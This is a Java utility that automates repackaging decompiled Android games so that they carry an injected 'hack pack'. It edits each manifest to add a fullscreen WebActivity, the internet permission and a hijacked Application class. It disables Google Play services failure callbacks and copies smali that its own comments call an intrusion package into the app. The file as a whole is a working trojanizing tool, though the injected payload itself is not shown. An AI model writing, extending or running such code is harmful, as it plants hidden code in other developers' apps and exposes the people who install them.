package com.test;

import com.codefactory.abstracts.ParseBase;
import com.codefactory.intface.CallBack;
import com.codefactory.node.XmlNode;
import com.codefactory.utils.Util_File;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class WorkPlus {
    public static void main(String[] args) {
//        getFileList();
//        buildHackProjectDirS("D:\\ApkNeed\\GC", "D:\\ApkNeed\\app-debug");
          buildHackProjectDir("D:\\ApkNeed\\3DM日常\\最后的希望：僵尸大战","D:\\\\ApkNeed\\\\app-debug",true);
    }

    private static void getFileList() {
        List<String> projectdirs = new ArrayList<>();
        String parentpath = "D:\\ApkNeed\\18183";
        File realFile = new File(parentpath);
        final File[] subfiles = realFile.listFiles();
        for (File file : subfiles) {
            if (file.isDirectory()) {

            } else {
//                projectdirs.add(file.getName());
                System.out.println(file.getName());
            }
        }

    }

    private static void buildHackProjectDirS(String parentpath, String hackpack) {
        List<String> projectdirs = new ArrayList<>();
        File realFile = new File(parentpath);
        final File[] subfiles = realFile.listFiles();
        for (File file : subfiles) {
            if (file.isDirectory()) {
                System.out.println(file.getAbsolutePath());
                projectdirs.add(file.getAbsolutePath());
            }
        }
        {
            for (int i = 0; i < projectdirs.size(); i++) {
                String subproject = projectdirs.get(i);
                buildHackProjectDir(hackpack, subproject,true);
            }
        }
    }

    private static void buildHackProjectDir(String subproject,String hackpack, final boolean needhackgoogle) {
        List<String> smalidirs = new ArrayList<>();
        System.out.println(subproject);
        String androidmanfestpath = subproject + File.separator + "AndroidManifest.xml";
        String filecontent = Util_File.inputStream2String(androidmanfestpath);
        ParseBase manifestnode = new XmlNode().build().parse(filecontent);
        System.out.println("解析完毕");
        List<ParseBase> applicationnode = manifestnode.getNodeInThisLevel("application");
        List<String> applicationpropertys = applicationnode.get(0).getPropertyValueInThisLevelNode("name");
        List<ParseBase> activitynodes = manifestnode.getNodeAllLevel("activity");
        String laucheractivity = "";//获得lancheractivity
        System.out.println("获得lancheractivity");
        for (int j = 0; j < activitynodes.size(); j++) {
            String activitycontent = activitynodes.get(j).getEntityString();
            if (activitycontent.contains("android.intent.category.LAUNCHER")) {
                laucheractivity = activitynodes.get(j).getPropertyValueInThisLevelNode("name").get(0).replace("\"", "");
            }
        }


        final String applicationname;
        if (applicationpropertys.size() > 0) {
            applicationname = applicationpropertys.get(0).replace(".", "/").replace("\"", "");
            //对特定路径的smali文件进行修改 .super Landroid/app/Application; 替换为 .super Llock/hacks/ListenerApplication;
        } else {
            applicationname = "";
            manifestnode.addProperty("application", "android:name", "lock.hacks.ListenerApplication");//为节点添加一个属性
        }
        {
            System.out.println("增加节点标注需要注入的activity");

            //增加meta-data节点标注需要注入的activity
            ParseBase meta_datanode = new XmlNode().build("meta-data");
            meta_datanode.setIsSpecail(true);
            meta_datanode.addProperty("android:name", "loadclass");
            meta_datanode.addProperty("android:value", laucheractivity);
            manifestnode.addNodeToAlreadyNodeByNodeName("application", meta_datanode);

            ParseBase meta_datanode2 = new XmlNode().build("meta-data");
            meta_datanode2.setIsSpecail(true);
            meta_datanode2.addProperty("android:name", "need");
            meta_datanode2.addProperty("android:value", "srx");
            manifestnode.addNodeToAlreadyNodeByNodeName("application", meta_datanode2);

            //增加Webctivity
            ParseBase activitynode = new XmlNode().build("activity");
            activitynode.setIsSpecail(true);
            activitynode.addProperty("android:name", "lock.hacks.WebActivity");
            activitynode.addProperty("android:screenOrientation", "portrait");
            activitynode.addProperty("android:theme", "@android:style/Theme.NoTitleBar.Fullscreen");
            manifestnode.addNodeToAlreadyNodeByNodeName("application", activitynode);

            //增加intent访问权限
            ParseBase permissionnode = new XmlNode().build("uses-permission");
            permissionnode.setIsSpecail(true);
            permissionnode.addProperty("android:name", "android.permission.INTERNET");
            manifestnode.addNodeToAlreadyNodeByNodeName("manifest", permissionnode);

            String manfesttmpcontent = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?>" + (manifestnode.getEntityString().replace("<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?>", ""));
            Util_File.string2Stream(manfesttmpcontent, androidmanfestpath);
        }
        {//判断v4包注入
            System.out.println("判断v4包注入");
            boolean needfixv4 = true;//是否要注入v4

            File realFilesmali = new File(subproject);
            final File[] subsmalifiles = realFilesmali.listFiles();
            for (File file : subsmalifiles) {
                if (file.isDirectory()) {
//                System.out.println(file.getAbsolutePath());
                    if (file.getAbsolutePath().replace("\\", "/").matches(subproject.replace("\\", "/") + "/(assets|lib|original|res|unknown)")) {

                    } else {
                        smalidirs.add(file.getAbsolutePath());
                        if (new File(file.getAbsolutePath() + "/android/support/v4/").exists()) {
                            if (new File(file.getAbsolutePath() + "/android/support/v4/widget/DrawerLayout.smali").exists()) {
                                needfixv4 = false;
                            } else {
                                //说明存在老的v4包
                                Util_File.deletelink(file.getAbsolutePath(), null);//进行删除老的v4
                            }
                        }

                    }

                }
            }
            if (needfixv4) {//需要注入v4包
                File hackv4 = new File(hackpack + "/smali/android");
                Util_File.copy(hackv4.getAbsolutePath(), smalidirs.get(smalidirs.size() - 1) + "/android");//copynet
            }
        }

        //判断修改application超类 和修改apktool.yml里的minsdk显示
        {//和修改apktool.yml里的minsdk显示
            System.out.println("修改apktool.yml里的minsdk显示");
            File apkyml = new File(subproject + "/apktool.yml");
            if (apkyml.exists()) {
                String apkymlcontent = Util_File.inputStream2String(apkyml);
                Pattern pattern = Pattern.compile("sdkInfo:([\\s\\S]*?)sharedLibrary: false");//提取这里的文字
                Matcher matcher = pattern.matcher(apkymlcontent);
                if (matcher.find()) {
                    String tmp = matcher.group(1);
                    Pattern minsdkp = Pattern.compile("[\\s\\S]*?minSdkVersion: '(.*)'[\\s\\S]*");
                    Matcher minsdkm = minsdkp.matcher(tmp);
                    if (minsdkm.find()) {
                        String minsdk = minsdkm.group(1);
                        if (Integer.parseInt(minsdk.trim()) < 15) {
                            apkymlcontent = apkymlcontent.replace("minSdkVersion: \'" + minsdk + "\'", "minSdkVersion: \'15\'");
                            Util_File.string2Stream(apkymlcontent, apkyml);
                        }
                        Pattern targetSdkp = Pattern.compile("[\\s\\S]*?targetSdkVersion: '(.*)'[\\s\\S]*");
                        Matcher targetSdkm = targetSdkp.matcher(tmp);
                        if (!targetSdkm.find()) {
                            apkymlcontent = apkymlcontent.replace("sharedLibrary: false", "targetSdkVersion: '22'\nsharedLibrary: false");
                            Util_File.string2Stream(apkymlcontent, apkyml);
                        }
                    }


                }
            }
        }
        {
            System.out.println("判断修改application超类+如果是google框架的干掉框架验证反馈");
            Util_File.getFileUnderDirEx(subproject, subproject.replace("\\", "/") + "/(assets|unknown|lib|original|res|.+?/android)", "", new CallBack() {
                @Override
                public void back(Object... object) {
                    File file = (File) object[0];
                    System.out.println("遍历文件" + file.getAbsolutePath().replace("\\", "/"));
//                    System.out.println("--------------------------------------");
                    //判断修改application超类
                    if (!"".equals(applicationname) && file.getAbsolutePath().replace("\\", "/").matches("(.*)" + applicationname + "(.*)")) {//对application类进行设置

                        System.err.println("发现需要修改的application文件->" + file.getName());
                        String smalicontent = Util_File.inputStream2String(file);
                        Pattern superapplication = Pattern.compile("\\.super Landroid/app/Application;");
                        Matcher supermatcher = superapplication.matcher(smalicontent);
                        if (supermatcher.find()) {//匹配上了
                            smalicontent = smalicontent.replace(supermatcher.group(), ".super Llock/hacks/ListenerApplication;");
//                            System.err.println(file.getName());
                            Util_File.string2Stream(smalicontent, file.getAbsolutePath());
                        }
                    }
                    if(needhackgoogle){
                        if (file.getAbsolutePath().matches(".*google.*")) {//如果是google框架的干掉框架验证反馈
                            System.err.println("发现需要修改的google文件->" + file.getName());
                            String googlecontent = Util_File.inputStream2String(file);
                            googlecontent = googlecontent.replace("invoke-interface {v0, p1}, Lcom/google/android/gms/common/api/GoogleApiClient$OnConnectionFailedListener;->onConnectionFailed(Lcom/google/android/gms/common/ConnectionResult;)V", "#invoke-interface {v0, p1}, Lcom/google/android/gms/common/api/GoogleApiClient$OnConnectionFailedListener;->onConnectionFailed(Lcom/google/android/gms/common/ConnectionResult;)V");
                            googlecontent = googlecontent.replace("invoke-interface {v0, p1}, Lcom/google/android/gms/common/GooglePlayServicesClient$OnConnectionFailedListener;->onConnectionFailed(Lcom/google/android/gms/common/ConnectionResult;)V", "#invoke-interface {v0, p1}, Lcom/google/android/gms/common/GooglePlayServicesClient$OnConnectionFailedListener;->onConnectionFailed(Lcom/google/android/gms/common/ConnectionResult;)V");
                            Util_File.string2Stream(googlecontent, file.getAbsolutePath());
                        }
                    }



                }
            });
        }
        {//植入assets框架 植入入侵包
            System.out.println("植入assets框架 植入入侵包");
            File assetdir = new File(hackpack + "/assets");
            File hackdir = new File(hackpack + "/smali/lock");
            Util_File.copy(hackdir.getAbsolutePath(), smalidirs.get(smalidirs.size() - 1) + "/lock");//copynet
            Util_File.copy(assetdir.getAbsolutePath(), subproject + "/assets");//copynet
        }
        System.out.println("finsih");
    }
}
